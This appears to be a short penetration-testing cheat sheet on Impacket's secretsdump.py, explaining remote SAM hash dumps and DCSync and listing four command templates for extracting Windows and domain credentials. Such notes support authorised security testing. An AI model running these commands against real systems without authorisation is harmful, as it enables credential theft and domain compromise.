# Windows Secrets

Secretsdump is a script used to extract credentials and secrets from a system. The main use-cases for it are the following:

* Dump NTLM hash of local users (remote SAM dump)
* Extract domain credentials via DCSync

```bash
secretsdump.py -just-dc $username:$password@$domain/$hostname/$IP
```

```bash
secretsdump.py -dc-ip $ip $username:$password@$domain/$hostname/$IP
```

```bash
secretsdump.py -k -no-pass $domain/$hostname/$IP
```

```bash
secretsdump.py $domain/$username@$hostname/$IP 
```
